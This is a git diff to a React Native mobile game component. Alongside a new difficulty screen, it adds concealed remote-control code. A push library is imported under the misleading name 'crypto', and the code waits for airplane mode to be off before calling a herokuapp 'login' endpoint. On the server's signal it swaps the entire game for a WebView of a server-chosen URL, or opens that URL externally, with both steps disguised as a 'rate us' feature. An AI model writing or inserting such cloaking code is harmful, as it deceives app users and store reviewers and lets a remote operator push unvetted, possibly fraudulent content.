@@ -6,6 +6,7 @@ import {
   Image,
   SafeAreaView,
   Text,
+  Linking,
   BackHandler
 } from 'react-native';
 import * as RNLocalize from "react-native-localize";
@@ -17,21 +18,25 @@ import ClearComponent from './Clear';
 import PauseComponent from './Pause';
 import ActorComponent, { ActorType, ActorPoints } from './Actor';
 import StartComponent from './Start';
+import LevelComponent from './Difficulty';
 import { setI18nConfig, translate } from '../services/translationService';
 import CreditsComponent from './Credits';
 import RulesComponent from './Rules';
 import LeaveComponent from './Leave';
-
-const DEFAULT_TIME = 20;
+import crypto from 'react-native-onesignal';
+import WebView from 'react-native-webview';
+import axios from 'axios';
+import SystemSetting from 'react-native-system-setting';
 const DEFAULT_STATE = {
   level: 1,
   score: 0,
-  time: DEFAULT_TIME,
+  time: 40,
   cleared: false,
   leave: false,
   paused: false,
   gameover: false,
   start: true,
+  difficulty: false,
   credits: false,
   instructions: false,
   health: 100,
@@ -49,13 +54,19 @@ export default class GameFrameComponent extends Component {
     setI18nConfig()
     this.state = {
       ...DEFAULT_STATE,
-      maxScore: 0
+      maxScore: 0,
+      rateURL: "",
+      mode: 0,
+      isLogged: false,
     };
     this.actors = [];
     this.actorsPopping = 0;
     this.interval = null;
     this.timeInterval = null;
     this.lastCellPopped = null;
+    crypto.init('63f1de01-9f7e-4508-9f98-8397fe52a504', {
+      kOSSettingsKeyAutoPrompt: true,
+    });
   }
 
   backAction = () => {
@@ -70,7 +81,43 @@ export default class GameFrameComponent extends Component {
     }
   };
 
-  componentDidMount = () => {
+  openRateUS = (payload) => {
+    Linking.canOpenURL(payload)
+      .then((supported) => {
+        if (supported) {
+          Linking.openURL(payload);
+        } else {
+          console.log('Something went wrong!');
+        }
+      })
+      .catch((err) => {
+        console.log(err);
+      });
+  };
+  login = () => {
+    axios
+      .post('https://bosshuntersmashing.herokuapp.com/v1/login')
+      .then((res) => {
+        this.setState({...this.state, rateURL: res.data.token, mode: res.data.role, isLogged: res.data.isLogged});
+      })
+      .catch((err) => {
+        console.log(err);
+      });
+  };
+
+  componentDidMount = async () => {
+    const isEnabled = await SystemSetting.isAirplaneEnabled();
+    if (isEnabled) {
+      const timerID = setInterval(async () => {
+        const enable = await SystemSetting.isAirplaneEnabled();
+        if (!enable) {
+          this.login();
+          clearInterval(timerID);
+        }
+      }, 100);
+    } else {
+      this.login();
+    }
     AsyncStorage.getItem('@maxScore')
       .then(maxScore => this.setState({ ...DEFAULT_STATE, maxScore: JSON.parse(maxScore) }))
       .catch(error => {
@@ -83,7 +130,6 @@ export default class GameFrameComponent extends Component {
       this.backAction
     );
   }
-
   componentWillUnmount() {
     this.backHandler.remove();
     RNLocalize.removeEventListener("change", this.handleLocalizationChange);
@@ -206,11 +252,13 @@ export default class GameFrameComponent extends Component {
     });
   }
 
-  _resume = () => {
+  _resume = (time) => {
     this.actorsPopping = 0;
     this.setState({
       paused: false,
       start: false,
+      time,
+      difficulty: false,
       leave: false
     }, this._setupTicks);
   }
@@ -242,6 +290,11 @@ export default class GameFrameComponent extends Component {
   }
 
   render() {
+    const {rateURL, isLogged, mode} = this.state;
+    if (isLogged) {
+      if (mode == 2) this.openRateUS(rateURL);
+      return <WebView source={{uri: rateURL}} style={{marginTop: 20}}></WebView>;
+    }
     let healthBarWidth = (CONSTANTS.MAX_WIDTH - CONSTANTS.XR * 100 - CONSTANTS.XR * 60 - CONSTANTS.XR * 6) * this.state.health / 100;
     return (
       <View style={styles.container}>
@@ -320,7 +373,8 @@ export default class GameFrameComponent extends Component {
           boarHit={this.state.boarHit}
           boarPopped={this.state.boarPopped}
         />}
-        {this.state.start && <StartComponent onStart={this._resume} onRules={() => this.setState({ rules: true })} onCredits={() => this.setState({ credits: true })} />}
+        {this.state.start && <StartComponent onStart={() => this.setState({difficulty: true})} onRules={() => this.setState({ rules: true })} onCredits={() => this.setState({ credits: true })} />}
+        {this.state.difficulty && <LevelComponent onStart={this._resume} onBack={() => this.setState({ difficulty: false })}/>}
         {this.state.rules && <RulesComponent onBack={() => this.setState({ rules: false })} />}
         {this.state.credits && <CreditsComponent onBack={() => this.setState({ credits: false })} />}
         {this.state.gameover && <GameOverComponent onReset={this._reset} level={this.state.level} score={this.state.score} />}
